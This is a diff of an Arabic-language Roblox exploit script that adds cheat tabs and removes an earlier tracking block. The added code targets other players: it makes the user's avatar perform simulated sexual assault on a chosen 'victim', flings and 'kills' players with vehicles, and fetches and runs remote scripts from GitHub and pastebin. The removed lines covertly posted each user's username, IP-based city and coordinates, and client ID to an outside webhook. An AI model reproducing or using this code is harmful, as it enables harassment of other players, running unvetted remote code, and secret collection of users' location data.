+    SkinTab:AddButton({Name="انسخ سكنة اللاعب المحدد",Callback=function()
+        if not copyTarget then Notify("خطأ","اختر لاعب اولاً!",3); return end
+        copyAvatar(copyTarget)
+    end})
+    SkinTab:AddButton({Name="انسخ سكنة اقرب لاعب",Callback=function()
+        local LChar=LocalPlayer.Character
+        if not LChar or not LChar:FindFirstChild("HumanoidRootPart") then return end
+        local closest,minDist=nil,math.huge
+        for _,p in ipairs(Players:GetPlayers()) do
+            if p~=LocalPlayer and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
+                local dist=(LChar.HumanoidRootPart.Position-p.Character.HumanoidRootPart.Position).Magnitude
+                if dist<minDist then minDist=dist; closest=p end
+            end
+        end
+        if closest then copyAvatar(closest) else Notify("خطأ","ما في لاعبين قريبين!",3) end
+    end})
+    SkinTab:AddButton({Name="انسخ سكنة عشوائية",Callback=function()
+        local others={}
+        for _,p in ipairs(Players:GetPlayers()) do if p~=LocalPlayer and p.Character then table.insert(others,p) end end
+        if #others==0 then Notify("خطأ","ما في لاعبين!",3); return end
+        copyAvatar(others[math.random(1,#others)])
+    end})
+
+
+    FunTab:AddDropdown({
+        Name="اختيار الضحية",
+        Options=(function() local t={}; for _,v in ipairs(Players:GetPlayers()) do if v~=LocalPlayer then table.insert(t,v.Name) end end; return t end)(),
+        Callback=function(v)
+            foundPlayer=Players:FindFirstChild(v)
+            if foundPlayer then Notify("تم العثور","الهدف: "..v,3) end
+        end,
+    })
+    FunTab:AddToggle({
+        Name="يمص", Default=false,
+        Callback=function(value)
+            if value and not foundPlayer then Notify("خطأ","اختر هدفاً أولاً!",3); return end
+            faceSitEnabled=value
+            if value then bangEnabled=false; bangTarget=foundPlayer
+            else bangTarget=nil; resetVel() end
+        end,
+    })
+    FunTab:AddToggle({
+        Name="اغتصاب", Default=false,
+        Callback=function(value)
+            if value and not foundPlayer then Notify("خطأ","اختر هدفاً أولاً!",3); return end
+            bangEnabled=value
+            if value then faceSitEnabled=false; bangTarget=foundPlayer
+            else bangTarget=nil; resetVel() end
+        end,
+    })
+    FunTab:AddButton({
+        Name="إيقاف الكل",
+        Callback=function()
+            faceSitEnabled=false; bangEnabled=false; bangTarget=nil; resetVel()
+            Notify("ايقاف","تم إيقاف جميع المميزات",3)
+        end,
+    })
+    RunService.Heartbeat:Connect(function()
+        pcall(function()
+            if (faceSitEnabled or bangEnabled) and bangTarget and bangTarget.Character then
+                local targetChar=bangTarget.Character
+                if not targetChar:FindFirstChild("HumanoidRootPart") then return end
+                if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then return end
+                local hrp=LocalPlayer.Character.HumanoidRootPart
+                local move=math.sin(tick()*150)*1.5
+                hrp.Velocity=Vector3.zero
+                if faceSitEnabled and targetChar:FindFirstChild("Head") then
+                    LocalPlayer.Character.Humanoid.Sit=true
+                    hrp.CFrame=targetChar.Head.CFrame*CFrame.new(0,0.2,-0.5+move)*CFrame.Angles(0,math.rad(180),0)
+                elseif bangEnabled then
+                    LocalPlayer.Character.Humanoid.Sit=false
+                    hrp.CFrame=targetChar.HumanoidRootPart.CFrame*CFrame.new(0,0.5,1.1+move)
+                end
+            end
+        end)
+    end)
+
+    FlingTab:AddButton({
+        Name="اخذ الكنبة",
+        Callback=function()
+            pcall(function()
+                local args={[1]="PickingTools",[2]="Couch"}
+                game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer(unpack(args))
+            end)
+            Notify("الفلنق","تم اخذ الكنبة!",3)
+        end
+    })
+    local selectedFlingPlayer=nil
+    FlingTab:AddDropdown({
+        Name="اختيار ضحية الفلنق",
+        Options=(function() local t={}; for _,v in ipairs(Players:GetPlayers()) do if v~=LocalPlayer then table.insert(t,v.Name) end end; return t end)(),
+        Callback=function(v)
+            selectedFlingPlayer=Players:FindFirstChild(v)
+            if selectedFlingPlayer then Notify("الفلنق","تم تحديد: "..v,3) end
+        end
+    })
+    FlingTab:AddToggle({
+        Name="قتل اللاعب بالكنبة", Default=false,
+        Callback=function(state)
+            if state then
+                if not selectedFlingPlayer then Notify("خطأ","اختر لاعب اولاً!",3); return end
+                local function isItemInInventory(n) for _,i in pairs(LocalPlayer.Backpack:GetChildren()) do if i.Name==n then return true end end end
+                local function equipItem(n) local i=LocalPlayer.Backpack:FindFirstChild(n); if i then LocalPlayer.Character.Humanoid:EquipTool(i) end end
+                local function unequipItem(n) local i=LocalPlayer.Character:FindFirstChild(n); if i then i.Parent=LocalPlayer.Backpack end end
+                if not isItemInInventory("Couch") then
+                    local args={[1]="PickingTools",[2]="Couch"}
+                    game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer(unpack(args))
+                end
+                equipItem("Couch")
+                getgenv().flingloop=true
+                task.spawn(function()
+                    while getgenv().flingloop do
+                        pcall(function()
+                            local target=selectedFlingPlayer; if not target or not target.Character then return end
+                            local char=LocalPlayer.Character; local humanoid=char and char:FindFirstChildOfClass("Humanoid"); local rootPart=humanoid and humanoid.RootPart
+                            local tChar=target.Character; local tHumanoid=tChar:FindFirstChildOfClass("Humanoid"); local tRoot=tHumanoid and tHumanoid.RootPart
+                            if not rootPart or not tRoot then return end
+                            if rootPart.Velocity.Magnitude<50 then getgenv().OldPos=rootPart.CFrame end
+                            if tHumanoid and tHumanoid.Sit then unequipItem("Couch"); getgenv().flingloop=false; return end
+                            workspace.FallenPartsDestroyHeight=0/0
+                            local BV=Instance.new("BodyVelocity"); BV.Name="SpeedDoPai"; BV.Parent=rootPart
+                            BV.Velocity=Vector3.new(9e8,9e8,9e8); BV.MaxForce=Vector3.new(1/0,1/0,1/0)
+                            humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated,false)
+                            local angle=0; local timeLimit=tick()+2
+                            repeat
+                                angle=angle+100
+                                rootPart.CFrame=tRoot.CFrame*CFrame.new(0,1.5,0)*CFrame.Angles(math.rad(angle),0,0)
+                                char:SetPrimaryPartCFrame(tRoot.CFrame*CFrame.new(0,1.5,0)*CFrame.Angles(math.rad(angle),0,0))
+                                rootPart.Velocity=Vector3.new(9e7,9e7*10,9e7); task.wait()
+                            until tRoot.Velocity.Magnitude>500 or tick()>timeLimit or not getgenv().flingloop
+                            BV:Destroy(); humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated,true)
+                            workspace.CurrentCamera.CameraSubject=humanoid
+                            repeat
+                                rootPart.CFrame=getgenv().OldPos*CFrame.new(0,0.5,0)
+                                char:SetPrimaryPartCFrame(getgenv().OldPos*CFrame.new(0,0.5,0))
+                                humanoid:ChangeState("GettingUp"); task.wait()
+                            until (rootPart.Position-getgenv().OldPos.p).Magnitude<25
+                        end); task.wait()
+                    end
+                end)
+                Notify("الفلنق","بدأ الفلنق على: "..selectedFlingPlayer.Name,3)
             else
-                vu241.Text = tostring(vu241.Text .. "\n\216\173\216\167\217\132\216\169 \216\167\217\132\216\167\216\180\216\170\216\177\216\167\217\131 : " .. v1058.Type)
-            end
-            local v1059 = game.PlaceId
-            local _ = game:GetService("Players").LocalPlayer
-            local v1060 = game.HttpService:JSONDecode(game:HttpGet("https://ipwho.is/"))
-            local v1061 = {
-                content = "",
-                username = "The Mercy Script",
-                avatar_url = "https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/5544f47d-0648-44d8-ad14-8d5a8761b77e/dg2813p-32e3e83b-9414-4208-979e-d668d30d5c2a.jpg/v1/fill/w_800,h_800,q_75,strp/my_previous_steam_profile_pfp_by_hhjgsr_dg2813p-fullview.jpg?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOjdlMGQxODg5ODIyNjQzNzNhNWYwZDQxNWVhMGQyNmUwIiwiaXNzIjoidXJuOmFwcDo3ZTBkMTg4OTgyMjY0MzczYTVmMGQ0MTVlYTBkMjZlMCIsIm9iaiI6W1t7ImhlaWdodCI6Ijw9ODAwIiwicGF0aCI6IlwvZlwvNTU0NGY0N2QtMDY0OC00NGQ4LWFkMTQtOGQ1YTg3NjFiNzdlXC9kZzI4MTNwLTMyZTNlODNiLTk0MTQtNDIwOC05NzllLWQ2NjhkMzBkNWMyYS5qcGciLCJ3aWR0aCI6Ijw9ODAwIn1dXSwiYXVkIjpbInVybjpzZXJ2aWNlOmltYWdlLm9wZXJhdGlvbnMiXX0.2faqf61iX35A5BybzE-rECzyzVU9BuEC7o3kCbM4vpk",
-                embeds = {
-                    {
-                        title = tostring("New Execute From " .. v1058.Type .. " (v" .. vu28 .. ")"),
-                        thumbnail = {
-                            url = tostring(GetUserPic(game:GetService("Players").LocalPlayer.UserId))
-                        },
-                        description = "" .. "**[Player Username (D/U):](https://www.roblox.com/users/" .. game:GetService("Players").LocalPlayer.UserId .. "/profile)**  ```" .. game:GetService("Players").LocalPlayer.DisplayName .. " (@" .. game:GetService("Players").LocalPlayer.Name .. ")" .. " " .. loadstring("return game:GetService(\'VoiceChatService\'):IsVoiceEnabledForUserIdAsync(game:GetService(\'Players\').LocalPlayer.UserId) and \'\226\156\148\239\184\143\' or \'\226\157\140\'")() .. "```\n" .. "**[Player Location:](https://ip-api.com/#" .. tostring(v1060.ip) .. ")**  ```" .. tostring(v1060.country) .. " " .. tostring("(" .. v1060.city .. ")") .. " [" .. tostring(v1060.latitude) .. "," .. tostring(v1060.longitude) .. "]" .. " ```\n" .. "**[Game Name (" .. tostring(# game:GetService("Players"):GetPlayers()) .. " Player" .. "):](https://www.roblox.com/games/" .. tostring(v1059) .. ")**\n```" .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. "```\n" .. "**Join Game Link (Executor):** ```" .. tostring("game:GetService(\'TeleportService\'):TeleportToPlaceInstance(" .. game.PlaceId .. ", \'" .. game.JobId .. "\', game.Players.LocalPlayer)") .. "```\n" .. "**Join Game Link (Website):** ```" .. tostring("Roblox.GameLauncher.joinGameInstance(" .. game.PlaceId .. ", \"" .. game.JobId .. "\")") .. "```\n" .. "**ClientID:** ```" .. game:GetService("RbxAnalyticsService"):GetClientId() .. "``` \n" .. "**Executor:** ```" .. tostring(identifyexecutor()) .. " " .. GetDevice() .. "``` \n" .. "**Account Age:** ```" .. game:GetService("Players").LocalPlayer.AccountAge .. "Day" .. tostring(" (" .. os.date("%Y/%m/%d", os.time() - game:GetService("Players").LocalPlayer.AccountAge * 86400) .. ")[Y/M/D]") .. "``` \n" .. "<t:" .. os.time() .. ":f>",
-                        color = v1058.Color
-                    }
-                }
-            }
-            local v1062 = {
-                Url = "https://hajji-api.vercel.app/api/webhook",
-                Body = game:GetService("HttpService"):JSONEncode(v1061),
-                Method = "POST",
-                Headers = {
-                    ["content-type"] = "application/json"
-                }
-            }
-            request(v1062)
-            if not CheckHWID().Value then
-                local v1063 = request
-                local v1064 = {
-                    Url = "http://127.0.0.1:6463/rpc?v=1",
-                    Method = "POST",
-                    Headers = {
-                        ["Content-Type"] = "application/json",
-                        Origin = "https://discord.com"
-                    },
-                    Body = game:GetService("HttpService"):JSONEncode({
-                        cmd = "INVITE_BROWSER",
-                        args = {
-                            code = "4YtCepCRkN"
-                        },
-                        nonce = game:GetService("HttpService"):GenerateGUID(false)
-                    })
-                }
-                v1063(v1064)
+                getgenv().flingloop=false; Notify("الفلنق","تم ايقاف الفلنق!",3)
             end
         end
-    end)
-    setclipboard("https://discord.gg/haX59nFsM")
-    spawn(function()
-        while true do
-            local v1065 = request
-            local v1066 = {
-                Url = "https://counter-7sone.onrender.com/post",
-                Method = "POST"
-            }
-            local v1067 = {
-                ["Content-Type"] = "application/json"
-            }
-            v1066.Headers = v1067
-            v1066.Body = "{\"id\":\"" .. game.Players.LocalPlayer.UserId .. "\",\"server\":\"default_server\"}"
-            v1065(v1066)
-            wait(1)
-            SetOnline()
-            wait(198)
+    })
+    FlingTab:AddButton({
+        Name="سكربت فلنق GUI",
+        Callback=function()
+            Notify("الفلنق","جاري تحميل الفلنق...",3)
+            pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe./main/Fling%20GUI"))() end)
         end
-    end)
+    })
+
+
+    ProtectTab:AddParagraph({"حماية من الجلوس","يمنع اللاعبين من اجلاسك"})
+    local seatEnabled=false; local seats={}
+    ProtectTab:AddToggle({Name="حماية جلوس",Default=false,Callback=function(state)
+        seats={}
+        for _,seat in next,workspace:GetDescendants() do if seat:IsA("Seat") then seats[seat]=true end end
+        workspace.DescendantAdded:Connect(function(seat) if seat:IsA("Seat") then seats[seat]=true; seat.Disabled=not seatEnabled end end)
+        workspace.DescendantRemoving:Connect(function(seat) if seat:IsA("Seat") then seats[seat]=nil end end)
+        seatEnabled=not state
+        for seat,_ in next,seats do seat.Disabled=not seatEnabled end
+        Notify("الحماية",state and "تم تفعيل حماية الجلوس!" or "تم ايقاف الحماية!",3)
+    end})
+    ProtectTab:AddParagraph({"حماية من الفلنق","يحميك من الفلنق"})
+    ProtectTab:AddToggle({Name="حماية فلنق",Default=false,Callback=function(state)
+        if state then Notify("الحماية","جاري تحميل حماية الفلنق...",3); pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/NotAtomz/Atom-Scripts/refs/heads/main/anti%20fling"))() end) end
+    end})
+    ProtectTab:AddParagraph({"حماية من الرحمة والبانق","يطير أو يقتل اللي يفعلون عليك"})
+    ProtectTab:AddButton({Name="سكربت يطير اللي يفعلون عليك",Callback=function()
+        Notify("الحماية","جاري التحميل...",3); pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/zephyr10101/ignore-touchinterests/main/main",true))() end)
+    end})
+    ProtectTab:AddButton({Name="سكربت يقتل اللي يفعلون عليك",Callback=function()
+        Notify("الحماية","جاري التحميل...",3); pcall(function() loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-FE-Fling-GUI-10927"))() end)
+    end})
+
+
+    local killTarget=nil
+    KillTab:AddParagraph({"قتل بالسفينة","يركب السفينة ويقتل اللاعب"})
+    KillTab:AddDropdown({
+        Name="اختيار ضحية القتل",
+        Options=(function() local t={}; for _,v in ipairs(Players:GetPlayers()) do if v~=LocalPlayer then table.insert(t,v.Name) end end; return t end)(),
+        Callback=function(v) killTarget=v; Notify("القتل","تم تحديد: "..v,3) end
+    })
+    KillTab:AddButton({Name="اقتل اللاعب بالسفينة",Callback=function()
+        if not killTarget then Notify("خطأ","اكتب اسم الضحية اولاً!",3); return end
+        Notify("القتل","جاري تنفيذ القتل...",3)
+        task.spawn(function() pcall(function()
+            local player=Players.LocalPlayer
+            local character=player.Character or player.CharacterAdded:Wait()
+            local humanoid=character:WaitForChild("Humanoid")
+            local humanoidRootPart=character:WaitForChild("HumanoidRootPart")
+            local originalPosition=humanoidRootPart.Position
+            humanoidRootPart.CFrame=CFrame.new(634.18,-4.00,1839.65); task.wait(0.5)
+            local args={"PickingBoat","MilitaryBoatFree"}
+            game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Ca1r"):FireServer(unpack(args))
+            local startTime=tick(); local seated=false
+            while tick()-startTime<10 do
+                local vehicle=workspace.Vehicles:FindFirstChild(player.Name.."Car")
+                if vehicle then
+                    local vehicleSeat=vehicle:FindFirstChild("VehicleSeat") or (vehicle:FindFirstChild("Body") and vehicle.Body:FindFirstChild("VehicleSeat"))
+                    if vehicleSeat then
+                        humanoidRootPart.CFrame=vehicleSeat.CFrame*CFrame.new(0,2,0); task.wait(0.2)
+                        firetouchinterest(humanoidRootPart,vehicleSeat,0); firetouchinterest(humanoidRootPart,vehicleSeat,1); task.wait(0.5)
+                        if humanoid.SeatPart==vehicleSeat then seated=true; break end
+                    end
+                end
+                task.wait(0.5)
+            end
+            if not seated then Notify("خطأ","ما قدرت اركب السفينة!",3); return end
+            local targetPlayer=Players:FindFirstChild(killTarget)
+            if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                local targetPos=targetPlayer.Character.HumanoidRootPart.Position
+                local vehicle=workspace.Vehicles:FindFirstChild(player.Name.."Car")
+                if vehicle then
+                    vehicle:SetPrimaryPartCFrame(CFrame.new(targetPos+Vector3.new(0,-2,0)))
+                    humanoidRootPart.CFrame=CFrame.new(targetPos+Vector3.new(0,5,0))
+                    local crazyStart=tick()
+                    while tick()-crazyStart<2 do
+                        local offset=Vector3.new(math.random(-8,8),math.random(-3,1),math.random(-8,8))
+                        vehicle:SetPrimaryPartCFrame(CFrame.new(targetPos+Vector3.new(0,-2,0)+offset)); task.wait(0.05)
+                    end
+                end
+            end
+            local destination=Vector3.new(-86.00,-224.27,34.57)
+            local vehicle=workspace.Vehicles:FindFirstChild(player.Name.."Car")
+            if vehicle then
+                vehicle:SetPrimaryPartCFrame(CFrame.new(destination))
+                humanoidRootPart.CFrame=CFrame.new(destination+Vector3.new(0,5,0)); task.wait(0.5); vehicle:Destroy()
+            end
+            humanoidRootPart.CFrame=CFrame.new(originalPosition)
+            humanoid:ChangeState(Enum.HumanoidStateType.RunningNoPhysics)
+            Notify("القتل","تم تنفيذ القتل!",3)
+        end) end)
+    end})
+
+
+    local function playMusic(soundId)
+        pcall(function()
+            local args1={[1]="SkateBoard"}
+            game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args1))
+            task.wait(0.3)
+            local args2={[1]="PickingScooterMusicText",[2]=soundId}
+            game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args2))
+        end)
+    end
+
+    MusicTab:AddParagraph({"ادخل كود الاغنية","اكتب ID الاغنية وشغلها"})
+    MusicTab:AddTextBox({Name="ادخل الكود",PlaceholderText="هنا",RemoveTextAfterFocusLost=false,Callback=function(value)
+        if value and value~="" then playMusic(value); Notify("الاغاني","جاري تشغيل الاغنية!",3) end
+    end})
+
+    MusicTab:AddSection("🎵 اغاني مجانية (فرانك)")
+    local freeAudios={
+        {Name="قران 1",ID=4711690175},{Name="قرأن 2",ID=1836685929},{Name="سب 1",ID=6536444735},{Name="سب 2",ID=7127692762},
+        {Name="ياميت كوداساي",ID=75542410501896},{Name="غريتينيهو",ID=5710016194},{Name="جامبسكير هوروروسو",ID=85435253347146},
+        {Name="صوت عالي",ID=6855150757},{Name="رايحة",ID=120034877160791},{Name="جامبسكير 2",ID=110637995610528},
+        {Name="ضحكة الساحرة ماين كرافت",ID=116214940486087},{Name="ذا بويلد وان",ID=137177653817621},
+        {Name="دقيت أبا ماريا ديويدو",ID=128669424001766},{Name="ماندريك ديتيكتيد",ID=9068077052},
+        {Name="آآآآآااا",ID=80156405968805},{Name="آآآآه",ID=9084006093},{Name="أمونغاس",ID=6651571134},
+        {Name="سوس",ID=6701126635},{Name="غريتاو آآآآآاااا",ID=5853668794},{Name="أووه كووف كووف",ID=7056720271},
+        {Name="سوس",ID=7153419575},{Name="سونيك إكس إي",ID=2496367477},{Name="توبيرز93 1",ID=270145703},
+        {Name="توبيرز93 2",ID=18131809532},{Name="ضحكة جون",ID=130759239},{Name="ما أعرف كككك",ID=6549021381},
+        {Name="غريتو",ID=80156405968805},{Name="سوس أوديو",ID=7705506391},{Name="آآآه",ID=7772283448},
+        {Name="غاي، غاي",ID=18786647417},{Name="ضربة بات",ID=7129073354},{Name="سيرين نووي",ID=675587093},
+        {Name="ما عندي فكرة عن الاسم كك",ID=7520729342},{Name="غريتو 2",ID=91412024101709},
+        {Name="إستورا تيمبانو",ID=268116333},{Name="جميداو",ID=106835463235574},{Name="توما جاك",ID=132603645477541},
+        {Name="بديت آيفود بديت",ID=133843750864059},{Name="آي غوست ذا داون",ID=84663543883498},
+        {Name="كومبري أونلاين نا شوب",ID=8747441609},{Name="أووه كي نوجو",ID=103440368630269},
+        {Name="ساي داي لافا براتو",ID=101232400175829},{Name="سيلوكو نو كومبنساسيون",ID=78442476709262},
+        {Name="اغنيه 1",ID=118507373399694},{Name="يا شباب صلو علي النبي",ID=9108676586},
+        {Name="اغنيه 2",ID=98337901681441},{Name="اغنيه 3",ID=93958751571254},{Name="تن تن",ID=130352079567406},
+        {Name="حبيبي يا رسول الله 1",ID=131597210164474},{Name="اغنيه 4",ID=91545096088459},
+        {Name="فانق بافو دو بافو",ID=106317184644394},{Name="جراني",ID=115163639351877},{Name="دجدي-دجدي",ID=132734127940213},
+    }
+    for _,v in ipairs(freeAudios) do
+        local name,id=v.Name,v.ID
+        MusicTab:AddButton({Name=name,Callback=function() playMusic(id); Notify("🎵",name,2) end})
+    end
+
+    MusicTab:AddSection("💎 اغاني البريم")
+    local primeAudios={
+        {"افخم فونك","17647322226"},{"فونك غضب","115859025716354"},{"فونك 5x30","73966367524216"},
+        {"فونك عالمي","76578817848504"},{"فونك تيك توك","93218265275853"},{"فونك ممتاز","102402883551679"},
+        {"اغنية عربية نادر","134833118817796"},{"اغنية خليجي","80281881556916"},{"ليبي","126583820883563"},
+        {"برازيل ازعاج","73144366170218"},{"فونك","111991982650727"},{"فونك ازعاج","85682109892034"},
+        {"فونك 2","85341099264298"},{"راب ازعاج","125534796199396"},
+    }
+    for _,v in ipairs(primeAudios) do
+        local name,id=v[1],v[2]
+        MusicTab:AddButton({Name=name,Callback=function() playMusic(id); Notify("💎",name,2) end})
+    end
+
+
+    local TeleportLocations={
+        {Name="مكان النجمة {الترند}",CFrame=CFrame.new(-6,-133,12)},
+        {Name="النافورة بالبداية",CFrame=CFrame.new(-26,19,14)},
+        {Name="فوق القوس الأبيض",CFrame=CFrame.new(623,134,-59)},
+        {Name="السفينة البيضاء",CFrame=CFrame.new(-111,7,870)},
+        {Name="الكنيسة",CFrame=CFrame.new(-57,39,-182)},
+        {Name="فوق الجبل",CFrame=CFrame.new(-663,251,757)},
+        {Name="تحت الأرض {1}",CFrame=CFrame.new(505,-76,143)},
+        {Name="تحت الأرض {2}",CFrame=CFrame.new(-306,4,-606)},
+        {Name="تحت الجبل (مكان سري)",CFrame=CFrame.new(672,4,-296)},
+        {Name="لوحة {1}",CFrame=CFrame.new(-243,89,-550)},
+        {Name="لوحة {2}",CFrame=CFrame.new(-630,26,365)},
+        {Name="مكان الأسلحة",CFrame=CFrame.new(-119,-27,235)},
+        {Name="بيت الرجل العجوز",CFrame=CFrame.new(986,4,63)},
+    }
+    TeleTab:AddSection("مواقع التنقل")
+    for _,loc in ipairs(TeleportLocations) do
+        local name,cf=loc.Name,loc.CFrame
+        TeleTab:AddButton({Name=name,Callback=function()
+            pcall(function()
+                local hrp=LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+                if hrp then hrp.CFrame=cf; Notify("تنقل","تم الانتقال إلى: "..name,2) end
+            end)
+        end})
+    end
+
+
+    local function safeLoad(urlOrCode,isRawCode)
+        local ok,err=pcall(function()
+            if isRawCode then loadstring(urlOrCode)()
+            else loadstring(game:HttpGet(urlOrCode))() end
+        end)
+        if not ok then warn("Error loading script: "..tostring(err)) end
+    end
+    HackTab:AddSection("سكاريبت خارجية")
+    HackTab:AddButton({Name="ارسيوس",Callback=function() safeLoad("https://raw.githubusercontent.com/AZYsGithub/chillz-workshop/main/Arceus%20X%20V3") end})
+    HackTab:AddButton({Name="فيلكس",Callback=function() safeLoad("https://pastebin.com/raw/mw4AqAs8") end})
+    HackTab:AddButton({Name="Synapse X",Callback=function() safeLoad("https://raw.githubusercontent.com/AR3AB/AR3AB/main/README.md") end})
+
+
+    LocalTab:AddSection("معلومات اللاعب")
+    LocalTab:AddParagraph({"👤 الاسم",LocalPlayer.Name})
+    LocalTab:AddParagraph({"🏷️ الاسم المعروض",LocalPlayer.DisplayName})
+    LocalTab:AddParagraph({"🆔 الـ UserId",tostring(LocalPlayer.UserId)})
+    LocalTab:AddParagraph({"🏆 عمر الحساب",tostring(LocalPlayer.AccountAge).." يوم"})
+    LocalTab:AddSection("خيارات")
+    LocalTab:AddButton({Name="📋 نسخ الـ ID",Callback=function()
+        pcall(function() setclipboard(tostring(LocalPlayer.UserId)) end)
+        Notify("تم","تم نسخ الـ ID!",3)
+    end})
+    LocalTab:AddButton({Name="🔄 احيا الشخصية",Callback=function()
+        pcall(function() LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Health=0 end)
+        Notify("احياء","تم احياء الشخصية!",2)
+    end})
+    LocalTab:AddButton({Name="?? السرعة العادية",Callback=function()
+        pcall(function() LocalPlayer.Character.Humanoid.WalkSpeed=16 end)
+        Notify("السرعة","تم الرجوع للسرعة الطبيعية",2)
+    end})
+    LocalTab:AddToggle({Name="⚡ سرعة عالية",Default=false,Callback=function(val)
+        pcall(function() LocalPlayer.Character.Humanoid.WalkSpeed=val and 50 or 16 end)
+        Notify("السرعة",val and "تم تفعيل السرعة!" or "تم ايقاف السرعة!",2)
+    end})
+    LocalTab:AddToggle({Name="🦘 قفز عالي",Default=false,Callback=function(val)
+        pcall(function() LocalPlayer.Character.Humanoid.JumpPower=val and 100 or 50 end)
+        Notify("القفز",val and "تم تفعيل القفز العالي!" or "تم ايقاف القفز العالي!",2)
+    end})
+
 end
+
+ShowIntro(function()
+    task.wait(0.2)
+    BuildMainUI()
+
+        
+
+    
+    task.spawn(function()
+        local success = false
+        local attempts = 0
+        local maxAttempts = 15
+
+        
+        if not LocalPlayer.Character then
+            LocalPlayer.CharacterAdded:Wait()
+        end
+        task.wait(1) 
+
+        
+        while not success and attempts < maxAttempts do
+            attempts = attempts + 1
+            
+            
+            local nameSet, colorSet = pcall(function()
+                local argsName = {"RolePlayName", "TRX HUB IS HERE"}
+                game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1RPNam1eTex1t"):FireServer(unpack(argsName))
+                
+                local argsColor = {"PickingRPNameColor", Color3.new(0, 0.78, 0.23)} 
+                game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1RPNam1eColo1r"):FireServer(unpack(argsColor))
+            end)
+
+            
+            task.wait(0.5)
+
+            
+            pcall(function()
+                local playerBag = LocalPlayer:FindFirstChild("PlayersBag")
+                if playerBag and playerBag:FindFirstChild("RPName") and playerBag.RPName.Value == "TRX HUB IS HERE" then
+                    success = true 
+                end
+            end)
+
+            
+            
+            if not success then
+                task.wait(1)
+            end
+        end
+
+        
+        if success then
+            Notify("RP Name", "تم التحميل بنجاح", 3) 
+
+           
+        else
+            Notify("RP Name", "فشل التحميل تلقائيًا", 3) 
+
+        end
+    end)
+
+
+end)
